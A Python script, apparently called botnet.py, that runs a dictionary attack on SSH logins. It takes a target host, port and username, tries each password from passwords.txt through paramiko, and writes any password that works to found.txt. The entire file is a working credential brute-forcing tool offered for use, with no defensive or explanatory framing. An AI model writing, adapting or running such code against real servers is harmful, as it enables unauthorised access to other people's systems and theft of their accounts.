import threading
import optparse
import socket
import paramiko 
from termcolor import colored, cprint

class Botnet(object):
    def __init__(self, host, port, user):
        self.host = host
        self.port = port 
        self.user = user
        self.wordlist = open("passwords.txt", "r")
        
    def bruteforce(self, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.host, self.port, self.user, password, banner_timeout=30, allow_agent=False, look_for_keys=False)
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            error_code = 0
        except paramiko.AuthenticationException:
            error_code = 1
        except paramiko.SSHException:
            error_code = 2
        except socket.error:
            error_code = 3
        client.close()
        return error_code
    
    def main(self):
        for password in self.wordlist.readlines():
            password = password.strip("\n").strip("\r")
            try:
                response = self.bruteforce(password)
                if response == 0:
                    cprint("[+] Password found: " + password, "green")
                    with open("found.txt", "w") as found_file:
                        found_file.write(f"Host: {self.host}\n User: {self.user}\n Password: {password}")
                elif response == 1:
                    cprint(f"[-] {password} incorrect", "red")
                elif response == 2:
                    cprint("[-] Could not establish an connection", "cyan")
                elif response == 3:
                    cprint("[-] Socket error", "red")
            except Exception as e:
                print(str(e))

if __name__ == "__main__":
    parser = optparse.OptionParser("[*] Usage: python botnet.py -H 127.0.0.1 -p 22 -u username")
    parser.add_option("-H", type="string", help="Provide HostName", dest="target_host")
    parser.add_option("-p", type="string", help="Provide Port", dest="target_port")
    parser.add_option("-u", type="string", help="Provide Username", dest="target_username")
    (options, args) = parser.parse_args()
    if (options.target_host == None) | (options.target_port  == None) | (options.target_username == None):
        print(parser.usage)
    else:
        host = options.target_host
        port = options.target_port
        user = options.target_username
        bot = Botnet(host, port, user)
        bot.main()